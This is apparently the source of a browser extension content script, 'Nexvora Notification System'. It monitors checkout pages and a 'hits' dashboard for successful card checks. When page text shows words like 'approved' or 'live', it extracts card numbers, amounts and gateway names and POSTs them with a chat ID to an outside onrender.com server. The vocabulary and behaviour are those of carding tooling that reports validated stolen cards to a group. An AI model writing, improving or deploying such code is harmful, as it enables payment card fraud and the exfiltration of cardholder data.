/**
 * Nexvora Notification System v2.0
 * Monitors both the Dashboard and Checkout Pages for successful hits.
 */

(function() {
    const RENDER_URL = 'https://extensionshitteer.onrender.com';
    let userChatId = 'Unknown';
    let hasNotifiedSuccess = false; // Anti-duplicate flag for current page session

    // Get User Chat ID from storage
    chrome.storage.local.get(['chatId'], (result) => {
        if (result.chatId) {
            userChatId = result.chatId;
        }
    });

    const notifyServer = async (hitData) => {
        if (hasNotifiedSuccess) return; // Prevent multiple notifications on same page
        
        try {
            hasNotifiedSuccess = true;
            console.info('🚀 Nexvora: Sending hit to group...', hitData);

            const response = await fetch(`${RENDER_URL}/api/notify-hit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    card: hitData.card,
                    amount: hitData.amount,
                    gateway: hitData.gateway,
                    status: hitData.status,
                    user_chat_id: userChatId
                })
            });
            const data = await response.json();
            console.log('Notification Status:', data);
        } catch (error) {
            console.error('Failed to send notification:', error);
            hasNotifiedSuccess = false; // Allow retry on failure
        }
    };

    const processNewNode = (node) => {
        const text = node.innerText || node.textContent || '';
        const lowerText = text.toLowerCase();
        
        if (!text || text.length < 5) return;

        // Keywords from popups and dashboard
        const successKeywords = [
            'paid successfully', 
            'successfully hitted', 
            'congratulations', 
            'approved', 
            'success', 
            'live'
        ];

        const isSuccess = successKeywords.some(kw => lowerText.includes(kw));

        if (isSuccess) {
            console.info('✨ Nexvora: Successful hit detected!', text);
            
            // Extract data from the text or the page
            const parts = text.split('\n').map(p => p.trim()).filter(p => !!p);
            
            const hitData = {
                card: parts.find(p => /^\d{4,}/.test(p)) || 'N/A',
                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || document.querySelector('.amount')?.innerText || 'N/A',
                gateway: parts.find(p => ['stripe', 'square', 'braintree', 'paypal'].includes(p.toLowerCase())) || 'Stripe',
                status: 'Approved'
            };

            notifyServer(hitData);
        }
    };

    const setupObserver = () => {
        // Mode 1: Dashboard Monitoring (Specific containers)
        const dashboardContainers = [
            'recentHitsWrap',
            'hitsWrap'
        ].map(id => document.getElementById(id)).filter(el => !!el);

        if (dashboardContainers.length > 0) {
            dashboardContainers.forEach(container => {
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        mutation.addedNodes.forEach((node) => {
                            if (node.nodeType === 1) processNewNode(node);
                        });
                    });
                });
                observer.observe(container, { childList: true, subtree: true });
                console.log(`✅ Nexvora: Monitoring Dashboard (${container.id})...`);
            });
        }

        // Mode 2: Global Page Monitoring (For checkout popups/toasts)
        const globalObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) processNewNode(node);
                });
            });
        });

        globalObserver.observe(document.body, { childList: true, subtree: true });
        console.log('🌍 Nexvora: Global Monitoring Active (Checkout Pages).');
    };

    // Initialize
    console.log('🔥 Nexvora Notification System initialized.');
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupObserver);
    } else {
        setupObserver();
    }
})();
